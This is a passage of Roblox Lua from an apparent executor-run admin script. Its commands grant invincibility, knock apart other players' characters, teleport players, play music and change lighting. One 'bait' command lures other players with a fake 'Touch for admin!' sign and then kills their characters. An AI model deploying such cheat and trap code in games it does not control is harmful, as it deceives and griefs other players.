		powerupSound.SoundId = "rbxassetid://182755256"
		wait()
		powerupSound:Play()
	
		game:GetService("Debris"):AddItem(powerupSound,2)

		while char.HumanoidRootPart:FindFirstChild("Starman") do char.HumanoidRootPart.Starman:Destroy() end
		
		local starmanMusic = Instance.new("Sound",char.HumanoidRootPart)
		starmanMusic.Name = "Starman"
		starmanMusic.Volume = 1
		starmanMusic.Looped = true
		starmanMusic.SoundId = "rbxassetid://530596723"
		wait()
		starmanMusic:Play()

		if char:FindFirstChild("Shirt") then char.Shirt:Destroy() end
		if char:FindFirstChild("Pants") then char.Pants:Destroy() end

		char.Humanoid.WalkSpeed = 32
		char.Humanoid.MaxHealth = math.huge
		char.Humanoid.Health = math.huge
		
		local invisff = Instance.new("ForceField", char)
		invisff.Visible = false invisff.Name = 'smff'

		while char.HumanoidRootPart:FindFirstChild("StarmanFlash") do char.HumanoidRootPart.StarmanFlash:Destroy() end

		local light = Instance.new("PointLight",char.HumanoidRootPart)
		light.Name = "StarmanFlash"
		light.Brightness = 100
		light.Range = 20
		light.Shadows = true

		local function stardestroy(part)
			if part.Parent:FindFirstChild("Humanoid") and part.Parent ~= char then
				for i,v in pairs(part.Parent:GetChildren()) do
					if v:IsA("BasePart") then
						local force = Instance.new("BodyForce",v)
						force.Force = char.HumanoidRootPart.CFrame.lookVector * 50
						v:BreakJoints()
					end
				end
			
				local tadaas = {}
			
				for i = 1,1 do
					local tadaa = Instance.new("Sound",part.Parent.HumanoidRootPart)
					tadaa.Volume = 10
					tadaa.SoundId = "rbxassetid://551195499"
					table.insert(tadaas,tadaa)
				end
		
				wait()
		
				for i,v in pairs(tadaas) do
					v:Play()
				end
			end
		end

		local events = {}
		for i,v in pairs(char:GetChildren()) do
			if v:IsA("BasePart") then v.Material = Enum.Material.Neon table.insert(events,v.Touched:Connect(stardestroy)) end
		end
		if starmanEvents[plr.Name] then for i,v in pairs(starmanEvents[plr.Name]) do v:Disconnect() end starmanEvents[plr.Name] = nil end
		starmanEvents[plr.Name] = events
		starmanPlayers[plr.Name] = char
	end
	
	for _,plr in pairs(getPlayer(args[1], speaker)) do
		spawn(function()starman(gPlayers[plr])end)
	end
end)

addcmd("unstarman","Removes starman from [plr]",{},
function(args,speaker)
	for _,plr in pairs(getPlayer(args[1], speaker)) do
		pcall(function()
			if starmanPlayers[plr] then starmanPlayers[plr] = nil end
			if starmanEvents[plr] then for i,v in pairs(starmanEvents[plr]) do v:Disconnect() end starmanEvents[plr] = nil end
			local char = gPlayers[plr].Character
			while char.HumanoidRootPart:FindFirstChild("Starman") do
				char.HumanoidRootPart.Starman:Destroy()
			end
			while char.HumanoidRootPart:FindFirstChild("StarmanFlash") do
				char.HumanoidRootPart.StarmanFlash:Destroy()
			end
			while char.HumanoidRootPart:FindFirstChild("smff") do
				char.HumanoidRootPart.smff:Destroy()
			end
		end)
	end
end)

local Timers = {}
function checkTimer(n,t,res)
	if not Timers[n] then Timers[n] = 0 end
	
	if tick() >= Timers[n] + t then
		if res then Timers[n] = tick() end
		return true
	else
		return false
	end
end

function nonEmpty(t)
	for i,v in pairs(t) do
		return true
	end
	return false
end

game:GetService("RunService").RenderStepped:Connect(function()
	if nonEmpty(starmanPlayers) then
		if checkTimer("Starman",0.05,true) then					
			for name,plrchar in pairs(starmanPlayers) do
				ypcall(function()
					local colors = {"Bright red","Bright blue","Bright green","Bright yellow","Bright violet"}
					if not gPlayers:FindFirstChild(name) then starmanPlayers[name] = nil end
						
					local plr = gPlayers:FindFirstChild(name)
						
					if plr then
						local char = plrchar
						local light = char.HumanoidRootPart:FindFirstChild("StarmanFlash")
							
						local meshMap = {}

						for i,v in pairs(char:GetChildren()) do
							if v:IsA("CharacterMesh") then
								if v.BodyPart.Name == "Torso" then meshMap["Torso"] = "rbxassetid://"..v.MeshId end
								if v.BodyPart.Name == "LeftArm" then meshMap["Left Arm"] = "rbxassetid://"..v.MeshId end
								if v.BodyPart.Name == "RightArm" then meshMap["Right Arm"] = "rbxassetid://"..v.MeshId end
								if v.BodyPart.Name == "LeftLeg" then meshMap["Left Leg"] = "rbxassetid://"..v.MeshId end
								if v.BodyPart.Name == "RightLeg" then meshMap["Right Leg"] = "rbxassetid://"..v.MeshId end
							end
						end

						if char.Head:FindFirstChild("Mesh") then meshMap["Head"] = char.Head.Mesh.MeshId end
							
						if not char or char.Parent == nil then starmanPlayers[plr.Name] = nil end
						local newColor = BrickColor.new(colors[math.random(1,#colors)])
						while starmanLastColor == newColor do newColor = BrickColor.new(colors[math.random(1,#colors)]) end
						starmanLastColor = newColor
						for i,v in pairs(char:GetChildren()) do
							if v:IsA("BasePart") and v.Name ~= "HumanoidRootPart" then
								v.BrickColor = newColor
								local fade = v:Clone()
								if meshMap[v.Name] then
									local newMesh = Instance.new("SpecialMesh",fade)
									newMesh.MeshId = meshMap[v.Name]
								end
								fade.Name = "StarFade"
								fade.Anchored = true
								fade.CanCollide = false
								for n,c in pairs(fade:GetChildren()) do if c:IsA("Attachment") or c:IsA("Motor6D") or c:IsA("PointLight") or c:IsA("Sound") or c:IsA("Weld") then c:Destroy() end end
								fade.Parent = workspace.Terrain
								game:GetService("TweenService"):Create(fade,TweenInfo.new(0.5),{Transparency = 1}):Play()
								game:GetService("Debris"):AddItem(fade,0.5)
							end
						end
						light.Color = newColor.Color
					end
				end)
			end
		end
	end
end)

addcmd("tppos","Teleports a player to a coordinate",{},
function(args,speaker)
	if #args < 4 then return end
	local tpX,tpY,tpZ = tonumber(args[2]),tonumber(args[3]),tonumber(args[4])
	for _,plr in pairs(getPlayer(args[1], speaker)) do
		local char = gPlayers[plr].Character
		if char and char:FindFirstChild("HumanoidRootPart") then
			char.HumanoidRootPart.CFrame = CFrame.new(tpX,tpY,tpZ)
		end
	end
end)

addcmd("offset","Offsets a player by a coordinate",{},
function(args,speaker)
	if #args < 4 then return end
	local tpX,tpY,tpZ = tonumber(args[2]),tonumber(args[3]),tonumber(args[4])
	for _,plr in pairs(getPlayer(args[1], speaker)) do
		local char = gPlayers[plr].Character
		if char and char:FindFirstChild("HumanoidRootPart") then
			char.HumanoidRootPart.CFrame = char.HumanoidRootPart.CFrame + Vector3.new(tpX,tpY,tpZ)
		end
	end
end)

addcmd('bait',';)',{'troll'},
function(args, speaker)
spawn(function()
local M = Instance.new('Model', workspace) M.Name = 'IYbait'
local P = Instance.new('Part', M) P.Name = 'Main' P.Position = speaker.Character.Head.Position P.Color = maincolor P.Material = 'Neon' P.Size = Vector3.new(4, 1, 4)
y = Instance.new("BillboardGui")
y.Size = UDim2.new(0,100,0,150)
y.StudsOffset = Vector3.new(0,1,0)
y.Parent = P
y.Adornee = P
f = Instance.new("TextLabel")
f.Parent = y
f.BackgroundTransparency = 1
f.Position = UDim2.new(0,0,0,-50)
f.Size = UDim2.new(0,100,0,100)
f.Font = "Highway"
f.FontSize = "Size48"
f.Text = "Touch for admin!"
f.TextStrokeColor3 = Color3.new(0,0,0)
f.TextColor3 = Color3.new(255/255,255/255,255/255)
f.TextStrokeTransparency = 0
f.TextYAlignment = "Bottom"
P.Touched:connect(function(oof) if oof.Parent.Name ~= speaker.Name or oof.Parent.Name ~= LP.Name then if oof.Parent:FindFirstChild('Humanoid') then execCmd("oof " .. oof.Parent.Name, Player) end end end)
	end)
end)

addcmd('removebait','clears bait parts',{'nobait'},
function(args, speaker)
    local function dels(instance)
        for i,v in pairs(instance:GetChildren())do
            if v.name == "IYbait"then v:Destroy()end
            dels(v)
        end
    end
    dels(workspace)
end)

function CreateInstance(cls,props)
	local inst = Instance.new(cls)
	for i,v in pairs(props) do
		inst[i] = v
	end
	return inst end
local function createSoundFrame()
	local soundFrame = Instance.new("Frame") soundFrame.Name = "Sound" soundFrame.BackgroundColor3 = Color3.new(0, 0, 0) soundFrame.BackgroundTransparency = 1 soundFrame.BorderSizePixel = 0 soundFrame.Position = UDim2.new(0.5, -350, 0, -100) soundFrame.Size = UDim2.new(0, 700, 0, 35)
	local soundFrame4 = Instance.new("TextLabel") soundFrame4.Name = "SName" soundFrame4.Parent = soundFrame soundFrame4.BackgroundColor3 = Color3.new(1, 1, 1) soundFrame4.BackgroundTransparency = 1 soundFrame4.Position = UDim2.new(0, 3, 0, 2) soundFrame4.Size = UDim2.new(1, -6, 0, 15) soundFrame4.Font = Enum.Font.SourceSansBold soundFrame4.FontSize = Enum.FontSize.Size14 soundFrame4.Text = "Audio" soundFrame4.TextColor3 = Color3.new(1, 1, 1) soundFrame4.TextWrapped = true soundFrame4.TextYAlignment = Enum.TextYAlignment.Top
	local soundFrame6 = Instance.new("TextButton") soundFrame6.Name = "Pause" soundFrame6.Parent = soundFrame soundFrame6.BackgroundColor3 = Color3.new(0.901961, 0.901961, 0.901961) soundFrame6.BackgroundTransparency = 1 soundFrame6.Position = UDim2.new(0, 170, 1, -18) soundFrame6.Size = UDim2.new(0, 15, 0, 15) soundFrame6.Font = Enum.Font.SourceSans soundFrame6.FontSize = Enum.FontSize.Size14 soundFrame6.Text = "" soundFrame6.TextColor3 = Color3.new(0.901961, 0.901961, 0.901961)
	local soundFrame7 = CreateInstance("Frame",{Style=0,Active=false,AnchorPoint=Vector2.new(0,0),BackgroundColor3=Color3.new(0.90196084976196,0.90196084976196,0.90196084976196),BackgroundTransparency=0,BorderColor3=Color3.new(0.10588236153126,0.16470588743687,0.20784315466881),BorderSizePixel=0,ClipsDescendants=false,Draggable=false,Position=UDim2.new(0,3,0,0),Rotation=0,Selectable=false,Size=UDim2.new(0,2,1,0),SizeConstraint=0,Visible=true,ZIndex=1,Name="Line",Parent = soundFrame6})
	local soundFrame8 = CreateInstance("Frame",{Style=0,Active=false,AnchorPoint=Vector2.new(0,0),BackgroundColor3=Color3.new(0.90196084976196,0.90196084976196,0.90196084976196),BackgroundTransparency=0,BorderColor3=Color3.new(0.10588236153126,0.16470588743687,0.20784315466881),BorderSizePixel=0,ClipsDescendants=false,Draggable=false,Position=UDim2.new(1,-5,0,0),Rotation=0,Selectable=false,Size=UDim2.new(0,2,1,0),SizeConstraint=0,Visible=true,ZIndex=1,Name="Line",Parent = soundFrame6})
	local soundFrame9 = Instance.new("Frame") soundFrame9.Name = "Pos" soundFrame9.Parent = soundFrame soundFrame9.BackgroundColor3 = Color3.new(0.901961, 0.901961, 0.901961) soundFrame9.BackgroundTransparency = 1 soundFrame9.BorderSizePixel = 0 soundFrame9.Position = UDim2.new(0, 260, 1, -16) soundFrame9.Size = UDim2.new(1, -300, 0, 11)
	local soundFrame10 = Instance.new("Frame") soundFrame10.Name = "Touch" soundFrame10.Parent = soundFrame9 soundFrame10.BackgroundColor3 = Color3.new(1, 1, 1) soundFrame10.BorderSizePixel = 0 soundFrame10.Size = UDim2.new(0, 5, 0, 11)
	local soundFrame11 = CreateInstance("Frame",{Style=0,Active=false,AnchorPoint=Vector2.new(0,0),BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=0,BorderColor3=Color3.new(0.10588236153126,0.16470588743687,0.20784315466881),BorderSizePixel=0,ClipsDescendants=false,Draggable=false,Position=UDim2.new(0,0,0,5),Rotation=0,Selectable=false,Size=UDim2.new(1,0,0,1),SizeConstraint=0,Visible=true,ZIndex=1,Name="Line",Parent = soundFrame9})
	local soundFrame12 = Instance.new("TextLabel") soundFrame12.Name = "TimeEnd" soundFrame12.Parent = soundFrame soundFrame12.BackgroundColor3 = Color3.new(1, 1, 1) soundFrame12.BackgroundTransparency = 1 soundFrame12.Position = UDim2.new(1, -35, 1, -18) soundFrame12.Size = UDim2.new(0, 30, 0, 15) soundFrame12.Font = Enum.Font.SourceSans soundFrame12.FontSize = Enum.FontSize.Size14 soundFrame12.Text = "1:52" soundFrame12.TextColor3 = Color3.new(1, 1, 1) soundFrame12.TextYAlignment = Enum.TextYAlignment.Top
	local soundFrame13 = Instance.new("TextLabel") soundFrame13.Name = "TimeStart" soundFrame13.Parent = soundFrame soundFrame13.BackgroundColor3 = Color3.new(1, 1, 1) soundFrame13.BackgroundTransparency = 1 soundFrame13.Position = UDim2.new(0, 225, 1, -18) soundFrame13.Size = UDim2.new(0, 30, 0, 15) soundFrame13.Font = Enum.Font.SourceSans soundFrame13.FontSize = Enum.FontSize.Size14 soundFrame13.Text = "0:00" soundFrame13.TextColor3 = Color3.new(1, 1, 1) soundFrame13.TextYAlignment = Enum.TextYAlignment.Top
	local soundFrame15 = Instance.new("TextButton") soundFrame15.Name = "NextSong" soundFrame15.Parent = soundFrame soundFrame15.BackgroundColor3 = Color3.new(1, 1, 1) soundFrame15.BackgroundTransparency = 1 soundFrame15.Position = UDim2.new(0, 80, 1, -18) soundFrame15.Size = UDim2.new(0, 15, 0, 15) soundFrame15.Font = Enum.Font.SourceSans soundFrame15.FontSize = Enum.FontSize.Size14 soundFrame15.Text = "" soundFrame15.TextColor3 = Color3.new(1, 1, 1)
	local soundFrame16 = CreateInstance("Frame",{Style=0,Active=false,AnchorPoint=Vector2.new(0,0),BackgroundColor3=Color3.new(0.90196084976196,0.90196084976196,0.90196084976196),BackgroundTransparency=0,BorderColor3=Color3.new(0.10588236153126,0.16470588743687,0.20784315466881),BorderSizePixel=0,ClipsDescendants=false,Draggable=false,Position=UDim2.new(1,-2,0,0),Rotation=0,Selectable=false,Size=UDim2.new(0,2,1,0),SizeConstraint=0,Visible=true,ZIndex=1,Name="Line",Parent = soundFrame15})
	local soundFrame17 = CreateInstance("ImageLabel",{Image="rbxassetid://304846479",ImageColor3=Color3.new(0.90196084976196,0.90196084976196,0.90196084976196),ImageRectOffset=Vector2.new(0,0),ImageRectSize=Vector2.new(0,0),ImageTransparency=0,ScaleType=0,SliceCenter=Rect.new(0,0,0,0),Active=false,AnchorPoint=Vector2.new(0,0),BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,BorderColor3=Color3.new(0.10588236153126,0.16470588743687,0.20784315466881),BorderSizePixel=1,ClipsDescendants=false,Draggable=false,Position=UDim2.new(0,0,0,2),Rotation=90,Selectable=false,Size=UDim2.new(0,10,0,11),SizeConstraint=0,Visible=true,ZIndex=1,Name="ImageLabel",Parent = soundFrame15})
	local soundFrame18 = Instance.new("TextButton") soundFrame18.Name = "PrevSong" soundFrame18.Parent = soundFrame soundFrame18.BackgroundColor3 = Color3.new(1, 1, 1) soundFrame18.BackgroundTransparency = 1 soundFrame18.Position = UDim2.new(0, 20, 1, -18) soundFrame18.Size = UDim2.new(0, 15, 0, 15) soundFrame18.Font = Enum.Font.SourceSans soundFrame18.FontSize = Enum.FontSize.Size14 soundFrame18.Text = "" soundFrame18.TextColor3 = Color3.new(1, 1, 1)
	local soundFrame19 = CreateInstance("Frame",{Style=0,Active=false,AnchorPoint=Vector2.new(0,0),BackgroundColor3=Color3.new(0.90196084976196,0.90196084976196,0.90196084976196),BackgroundTransparency=0,BorderColor3=Color3.new(0.10588236153126,0.16470588743687,0.20784315466881),BorderSizePixel=0,ClipsDescendants=false,Draggable=false,Position=UDim2.new(0,0,0,0),Rotation=0,Selectable=false,Size=UDim2.new(0,2,1,0),SizeConstraint=0,Visible=true,ZIndex=1,Name="Line",Parent = soundFrame18})
	local soundFrame20 = CreateInstance("ImageLabel",{Image="rbxassetid://304846479",ImageColor3=Color3.new(0.90196084976196,0.90196084976196,0.90196084976196),ImageRectOffset=Vector2.new(0,0),ImageRectSize=Vector2.new(0,0),ImageTransparency=0,ScaleType=0,SliceCenter=Rect.new(0,0,0,0),Active=false,AnchorPoint=Vector2.new(0,0),BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,BorderColor3=Color3.new(0.10588236153126,0.16470588743687,0.20784315466881),BorderSizePixel=1,ClipsDescendants=false,Draggable=false,Position=UDim2.new(0,5,0,2),Rotation=-90,Selectable=false,Size=UDim2.new(0,10,0,11),SizeConstraint=0,Visible=true,ZIndex=1,Name="ImageLabel",Parent = soundFrame18})
	local soundFrame21 = Instance.new("TextLabel") soundFrame21.Name = "PlaylistCount" soundFrame21.Parent = soundFrame soundFrame21.BackgroundColor3 = Color3.new(1, 1, 1) soundFrame21.BackgroundTransparency = 1 soundFrame21.Position = UDim2.new(0, 40, 1, -18) soundFrame21.Size = UDim2.new(0, 35, 0, 15) soundFrame21.Font = Enum.Font.SourceSans soundFrame21.FontSize = Enum.FontSize.Size14 soundFrame21.Text = "1/1" soundFrame21.TextColor3 = Color3.new(1, 1, 1) soundFrame21.TextYAlignment = Enum.TextYAlignment.Top
	local soundFrame22 = Instance.new("ImageButton") soundFrame22.Name = "PlayStop" soundFrame22.Parent = soundFrame soundFrame22.BackgroundColor3 = Color3.new(0.901961, 0.901961, 0.901961) soundFrame22.BackgroundTransparency = 1 soundFrame22.BorderSizePixel = 0 soundFrame22.Position = UDim2.new(0, 145, 1, -18) soundFrame22.Rotation = 90 soundFrame22.Size = UDim2.new(0, 15, 0, 15) soundFrame22.AutoButtonColor = false soundFrame22.Image = "rbxassetid://304846479" soundFrame22.ImageColor3 = Color3.new(0.901961, 0.901961, 0.901961)
	return soundFrame end
local soundFrame = createSoundFrame()
soundFrame.Visible = true
local MusicPlayer do
	MusicPlayer = {}
	local playlist = {}
	local currentSong = 1
	local playlistHook = nil
	--local soundFrame = script.Parent:WaitForChild("Sound")
	local soundLine = soundFrame:WaitForChild("Pos")
	local soundTouch = soundLine:WaitForChild("Touch")
	local soundPlayStop = soundFrame:WaitForChild("PlayStop")
	local soundPause = soundFrame:WaitForChild("Pause")
	local soundNext = soundFrame:WaitForChild("NextSong")
	local soundPrev = soundFrame:WaitForChild("PrevSong")
	local soundButtons = {soundPlayStop,soundPause,soundNext,soundPrev}
	local mouseDrag = false
	local mouse = gPlayers.LocalPlayer:GetMouse()
	local lineBar = soundFrame:WaitForChild("Pos")
	adminSound = Instance.new("Sound",nil)
	local function timeConvert(num)
		local mins = math.floor(num/60)
		local secs = math.floor(num % 60)
		return tostring(mins)..":"..(math.floor(secs/10)==0 and "0" or "")..tostring(secs)
	end
	local function updateSongLine()
		local linePos = mouse.X - soundLine.AbsolutePosition.X
		if linePos >= 0 and linePos <= soundLine.AbsoluteSize.X then
			local movePos = linePos/soundLine.AbsoluteSize.X
			soundTouch.Position = UDim2.new(movePos,0,0,0)
		elseif linePos < 0 then
			soundTouch.Position = UDim2.new(0,0,0,0)
		else
			soundTouch.Position = UDim2.new(1,0,0,0)
		end
		local newTimePos = soundTouch.Position.X.Scale * adminSound.TimeLength
		adminSound.TimePosition = newTimePos
		soundFrame.TimeStart.Text = timeConvert(newTimePos)
		soundFrame.TimeEnd.Text = timeConvert(adminSound.TimeLength)
	end
	local function updateDetails(id)
		local info = game:GetService("MarketplaceService"):GetProductInfo(id)
		soundFrame.SName.Text = info.Name
	end
	local function setPlaylistHook()
		if playlistHook then playlistHook:Disconnect() playlistHook = nil end
		if #playlist == 0 then return end
		playlistHook = adminSound.DidLoop:connect(function()
			if currentSong == #playlist then currentSong = 1 else currentSong = currentSong + 1 end
			soundFrame.PlaylistCount.Text = tostring(currentSong).."/"..tostring(#playlist)
			MusicPlayer:Play(playlist[currentSong],true)
		end)
	end
	local function disconnectPlaylistHook()
		if playlistHook then playlistHook:disconnect() playlistHook = nil end
	end
	game:GetService("RunService").RenderStepped:Connect(function()
		if adminSound.Playing then
			soundTouch.Position = UDim2.new(adminSound.TimePosition/adminSound.TimeLength,0,0,0)
			soundFrame.TimeStart.Text = timeConvert(adminSound.TimePosition)
			soundFrame.TimeEnd.Text = timeConvert(adminSound.TimeLength)
		end
	end)
	lineBar.InputBegan:connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 then
			mouseDrag = true
			updateSongLine()
		end
	end)
	lineBar.InputEnded:connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 then
			mouseDrag = false
		end
	end)
	mouse.Move:connect(function(prop)
		if mouseDrag then
			updateSongLine()
		end
	end)
	function MusicPlayer:Play(id,plist)
		if not plist then playlist = {} disconnectPlaylistHook() soundFrame.PlaylistCount.Visible = false soundFrame.NextSong.Visible = false soundFrame.PrevSong.Visible = false end
		adminSound:Stop()
		if adminSound.Parent == nil then
			adminSound = Instance.new("Sound",workspace)
			adminSound.Name = "IYsound"
			adminSound.Looped = true
			if plist then setPlaylistHook() end
		end
		adminSound.SoundId = "rbxassetid://"..tostring(id)
		adminSound.TimePosition = 0
		--repeat wait() until adminSound.IsLoaded
		adminSound:Play()
		soundPlayStop.BackgroundTransparency = 0
		soundPlayStop.ImageTransparency = 1
		updateDetails(id)
	end
	function MusicPlayer:Playlist(list)
		playlist = list
		soundFrame.PlaylistCount.Visible = true soundFrame.NextSong.Visible = true soundFrame.PrevSong.Visible = true
		currentSong = 1
		if adminSound.Parent == nil then
			adminSound = Instance.new("Sound",workspace)
			adminSound.Name = "IYsound"
			adminSound.Looped = true
		end
		soundFrame.PlaylistCount.Text = "1/"..tostring(#playlist)
		MusicPlayer:Play(playlist[1],true)
		setPlaylistHook()
	end
	function MusicPlayer:Stop()
		adminSound:Stop()
		adminSound.TimePosition = 0
		soundTouch.Position = UDim2.new(0,0,0,0)
		soundFrame.TimeStart.Text = "0:00"
		soundPlayStop.BackgroundTransparency = 1
		soundPlayStop.ImageTransparency = 0
	end
	function MusicPlayer:Pause()
		adminSound:Pause()
		soundPlayStop.BackgroundTransparency = 1
		soundPlayStop.ImageTransparency = 0
	end
	function MusicPlayer:Resume()
		adminSound:Resume()
		soundPlayStop.BackgroundTransparency = 0
		soundPlayStop.ImageTransparency = 1
		setPlaylistHook()
	end
	function MusicPlayer:NextSong()
		if #playlist == 0 then return end
		if currentSong == #playlist then currentSong = 1 else currentSong = currentSong + 1 end
		soundFrame.PlaylistCount.Text = tostring(currentSong).."/"..tostring(#playlist)
		MusicPlayer:Play(playlist[currentSong],true)
	end
	function MusicPlayer:PrevSong()
		if #playlist == 0 then return end
		if currentSong == 1 then currentSong = #playlist else currentSong = currentSong - 1 end
		soundFrame.PlaylistCount.Text = tostring(currentSong).."/"..tostring(#playlist)
		MusicPlayer:Play(playlist[currentSong],true)
	end
	function MusicPlayer:SetSong(ind)
		if ind > #playlist or ind <= 0 then return end
		soundFrame.PlaylistCount.Text = tostring(ind).."/"..tostring(#playlist)
		MusicPlayer:Play(playlist[ind],true)
	end
	playerenabled = false
	function MusicPlayer:Show()
		soundFrame:TweenPosition(UDim2.new(0.5,-350,0,-72),Enum.EasingDirection.Out,Enum.EasingStyle.Quart,0.5,true)
	end
	function MusicPlayer:Hide()
		soundFrame:TweenPosition(UDim2.new(0.5,-350,0,-150),Enum.EasingDirection.Out,Enum.EasingStyle.Quart,0.5,true)
	end
	function colorFrames(obj,col)
		for i,v in pairs(obj:GetChildren()) do
			if v:IsA("ImageLabel") then
				v.ImageColor3 = col
			end
			v.BackgroundColor3 = col
		end
	end
	for i,v in pairs(soundButtons) do
		v.MouseEnter:connect(function()
			if v:IsA("ImageButton") then v.ImageColor3 = Color3.new(1,1,1) end
			if v:IsA("TextButton") then v.TextColor3 = Color3.new(1,1,1) end
			v.BackgroundColor3 = Color3.new(1,1,1)
			colorFrames(v,Color3.new(1,1,1))
		end)
		v.MouseLeave:connect(function()
			if v:IsA("ImageButton") then v.ImageColor3 = Color3.new(230/255, 230/255, 230/255) end
			if v:IsA("TextButton") then v.TextColor3 = Color3.new(230/255, 230/255, 230/255) end
			v.BackgroundColor3 = Color3.new(230/255, 230/255, 230/255)
			colorFrames(v,Color3.new(230/255, 230/255, 230/255))
		end)
	end
	soundPlayStop.MouseButton1Click:connect(function()
		if adminSound.Playing then
			MusicPlayer:Stop()
		else
			MusicPlayer:Resume()
		end
	end)	
	soundPause.MouseButton1Click:connect(function()
		MusicPlayer:Pause()
	end)	
	soundNext.MouseButton1Click:connect(MusicPlayer.NextSong)
	soundPrev.MouseButton1Click:connect(MusicPlayer.PrevSong)
end
local testgui = Instance.new("ScreenGui",game.CoreGui)
soundFrame.Parent = testgui
addcmd('playlist','makes a noice playlist',{'ids','player'},
function(args, speaker)
playerenabled = true
	if #args > 0 then
    for i,v in pairs(game:GetDescendants()) do
	if v:IsA'Sound'then v:Destroy() end end wait(0.1)
		if adminSound.Parent == nil then
			adminSound = Instance.new("Sound",workspace)
			adminSound.Name = "IYsound"
			adminSound.Looped = true
		end
		local idlist = splitString(args[1])
		local workingIds = {}
		for i,v in pairs(idlist) do if tonumber(v) then table.insert(workingIds,tonumber(v)) end end
		if #workingIds > 0 then
			playerenabled = true
			NOTIFY.NOTIFY:TweenPosition(UDim2.new(0,0,0,-100), "InOut", "Quart", 0.5, true, nil)
			MusicPlayer:Playlist(workingIds)
			MusicPlayer:Show() if qopen == true then quickmenu.sheild.cmds:TweenPosition(UDim2.new(0, 50, 0, -100), "InOut", "Quart", 0.5, true, nil) wait(0.01)
			quickmenu.sheild.settings:TweenPosition(UDim2.new(0, 146, 0, -100), "InOut", "Quart", 0.5, true, nil) wait(0.01)
			quickmenu.sheild.updates:TweenPosition(UDim2.new(0, 220, 0, -100), "InOut", "Quart", 0.5, true, nil) wait(0.01)
			quickmenu.sheild.info:TweenPosition(UDim2.new(0, 290, 0, -100), "InOut", "Quart", 0.5, true, nil) wait(0.01)
			quickmenu.sheild.mix:TweenPosition(UDim2.new(0, 340, 0, -100), "InOut", "Quart", 0.5, true, nil) wait(0.01) qopen = false end end
		else MusicPlayer:Show() NOTIFY.NOTIFY:TweenPosition(UDim2.new(0,0,0,-100), "InOut", "Quart", 0.5, true, nil) if qopen == true then quickmenu.sheild.cmds:TweenPosition(UDim2.new(0, 50, 0, -100), "InOut", "Quart", 0.5, true, nil) wait(0.01)
			quickmenu.sheild.settings:TweenPosition(UDim2.new(0, 146, 0, -100), "InOut", "Quart", 0.5, true, nil) wait(0.01)
			quickmenu.sheild.updates:TweenPosition(UDim2.new(0, 220, 0, -100), "InOut", "Quart", 0.5, true, nil) wait(0.01) playerenabled = true
			quickmenu.sheild.info:TweenPosition(UDim2.new(0, 290, 0, -100), "InOut", "Quart", 0.5, true, nil) wait(0.01)
			quickmenu.sheild.mix:TweenPosition(UDim2.new(0, 340, 0, -100), "InOut", "Quart", 0.5, true, nil) wait(0.01) qopen = false end end end)
addcmd('setsong','goto a song',{'tosong'},
function(args, speaker)
MusicPlayer:SetSong(tonumber(args[1]))
end)
addcmd('nextsong','forward a song',{'nxtsong'},
function(args, speaker)
MusicPlayer:NextSong()
end)
addcmd('prevsong','back a song',{'previoussong'},
function(args, speaker)
MusicPlayer:PrevSong()
end)
addcmd('hideplaylist','back a song',{'unplayer','noplayer','hideplayer'},
function(args, speaker)
playerenabled = false
MusicPlayer:Hide()
NOTIFY.NOTIFY:TweenPosition(UDim2.new(0, 0, 0, -38), "InOut", "Quart", 0.5, true, nil)
end)

addcmd('playhash', 'plays a hash instead of soundid',{'hash'},
function(args, speaker)
	for i,v in pairs(game:GetDescendants()) do
	if v:IsA'Sound'then v:Destroy() end end
    local c = args[1] or 'stop'
    if std.inTable({'stop'}, c:lower()) then return end
	local s = Instance.new("Sound", workspace)
	s.Name = "IYsound"
	s.Looped = true
	s.SoundId = c
    s.Volume = 1
	s:Play()
	playerenabled = false
	Notify('Playing hash')
 end)

addcmd('disco','disco party',{''},
function(args, speaker)
	_G.nodisco = nil
	coroutine.resume(coroutine.create(function()
repeat
	game:GetService('Lighting').GlobalShadows = true
    game:GetService('Lighting').FogEnd = 200
game:GetService('Lighting').TimeOfDay = 0
local r = 255
local g = 0
local b = 0
for i = 0,255,5 do
	if _G.nodisco ~=nil then return end
	r = r - 5
	b = b + 5
	game:GetService('Lighting').Ambient = Color3.fromRGB(r,g,b)
	game:GetService('Lighting').OutdoorAmbient = Color3.fromRGB(r,g,b)
	game:GetService('Lighting').FogColor = Color3.fromRGB(r,g,b)
	wait()
end
for i = 0,255,5 do
	if _G.nodisco ~=nil then return end
	g = g + 5
	game:GetService('Lighting').Ambient = Color3.fromRGB(r,g,b)
	game:GetService('Lighting').OutdoorAmbient = Color3.fromRGB(r,g,b)
	game:GetService('Lighting').FogColor = Color3.fromRGB(r,g,b)
	wait()
end
for i = 0,255,5 do
	if _G.nodisco ~=nil then return end
	b = b - 5
	game:GetService('Lighting').Ambient = Color3.fromRGB(r,g,b)
	game:GetService('Lighting').OutdoorAmbient = Color3.fromRGB(r,g,b)
	game:GetService('Lighting').FogColor = Color3.fromRGB(r,g,b)
	wait()
end
for i = 0,255,5 do
	if _G.nodisco ~=nil then return end
	r = r + 5
	game:GetService('Lighting').Ambient = Color3.fromRGB(r,g,b)
	game:GetService('Lighting').OutdoorAmbient = Color3.fromRGB(r,g,b)
	game:GetService('Lighting').FogColor = Color3.fromRGB(r,g,b)
	wait()
end
for i = 0,255,5 do
	if _G.nodisco ~=nil then return end
	g = g - 5
	game:GetService('Lighting').Ambient = Color3.fromRGB(r,g,b)
	game:GetService('Lighting').OutdoorAmbient = Color3.fromRGB(r,g,b)
	game:GetService('Lighting').FogColor = Color3.fromRGB(r,g,b)
	wait()
end
until _G.nodisco
end))
end)

addcmd('undisco','rip disco party',{''},
function(args, speaker)
_G.nodisco = true
execCmd('fixl')
end)

addcmd('hat','give a hat to a player',{''},
function(args, speaker)
local players = getPlayer(args[1], speaker)
for i,v in pairs(players)do
local char = gPlayers[v].Character
local Hat = game:GetService("InsertService"):LoadLocalAsset("rbxassetid://" .. args[2])
Hat.Parent = char
end end)

fm = Instance.new('BlockMesh', DATA)
fm.Scale = Vector3.new(1, 1, 2)
fm.Name = "FAT"
addcmd('fat','makes a plr fat',{''},
function(args, speaker)
local players = getPlayer(args[1], speaker)
for i,v in pairs(players)do
local char = gPlayers[v].Character
for _, child in pairs( char:GetChildren()) do
if child.ClassName == "CharacterMesh" then
child:Destroy() end end
for i,v in pairs(char:GetChildren()) do
